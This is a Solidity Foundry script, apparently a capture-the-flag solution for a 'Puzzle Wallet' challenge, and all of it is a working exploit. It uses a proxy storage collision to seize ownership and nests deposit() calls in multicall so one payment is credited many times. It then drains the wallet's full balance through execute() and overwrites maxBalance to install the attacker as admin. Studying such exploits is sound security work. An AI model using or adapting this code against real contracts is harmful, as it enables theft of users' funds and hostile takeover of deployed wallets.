// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function execute(address to, uint256 value, bytes calldata data) external;
    function multicall(bytes[] calldata data) external payable;
    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;

    function admin() external view returns (address);
    function balances(address addr) external view returns (uint256);
    function maxBalance() external view returns (uint256);
}

contract PuzzleWalletMaliciousContract is Constants {
    IPuzzleWallet victim;
    uint256 immutable i_depositAmount;

    constructor(IPuzzleWallet _victim) public payable {
        i_depositAmount = msg.value;
        victim = _victim;
    }
    function attack() public {
        uint256 victimBalance = address(victim).balance;
        
        console.log("Old admin: ", victim.admin());
        // console.log("Initial victim balance: ");
        // console.log(victimBalance);

        victim.proposeNewAdmin(address(this));
        victim.addToWhitelist(address(this));

        /*
        We'll make multiple deposits with a single msg.value by abusing the fact that
        the victim only tracks that there's a single deposit per function call.
        If we execute each deposit in its own multicall, we'll be able to run multiple
        deposits with the same msg.value.

        We'll do enough calls to deposit() to get the entire victim balance plus one 
        more so that our balance will be the initial victim balance + i_depositAmount.
        This way, we can take out our initial deposit amount along with all of the victim's balance.
        */
        uint256 numberOfDeposits = (victimBalance / i_depositAmount) + (victimBalance % i_depositAmount == 0 ? 0 : 1) + 1;

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");
        bytes memory multicallData = abi.encodeWithSignature(
            "multicall(bytes[])",
            depositData
        );
        bytes[] memory data = new bytes[](numberOfDeposits);
        for (uint256 i=0; i < numberOfDeposits; i++) {
            data[i] = multicallData;
        }
        victim.multicall{value: i_depositAmount}(data);

        // console.log("Malicious contract address: ", address(this));
        // console.log("Our balance:");
        // console.log(victim.balances(address(this)));

        victim.execute(address(this), victimBalance + i_depositAmount, "");
    }

    receive() external payable {
        // This is the initial deposit to fund our malicious contract
        if (msg.value == i_depositAmount) {
            return;
        }

        // console.log("Fallback called");
        // console.log(msg.value);
        // console.log("Victim balance: ");
        // console.log(address(victim).balance);

        // console.log("Becoming new admin");
        // console.log("Previous max balance:");
        // console.log(victim.maxBalance());

        // time to become the admin
        victim.setMaxBalance(uint256(uint160(ATTACKER_ADDRESS)));

        // console.log("New max balance:");
        // console.log(victim.maxBalance());
        console.log("New admin:", victim.admin());
    }
}

contract PuzzleWalletAttacker is Constants, Script {
    uint256 immutable DEPOSIT_AMOUNT = 0.001 ether / 20;  // victim should start with 0.001 ether, so let's deposit 1/20 of that

    function run() public {
        IPuzzleWallet victim = IPuzzleWallet(PUZZLE_WALLET_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        PuzzleWalletMaliciousContract _attacker = new PuzzleWalletMaliciousContract{value: DEPOSIT_AMOUNT}(victim);
        _attacker.attack();
        vm.stopBroadcast();
    }
}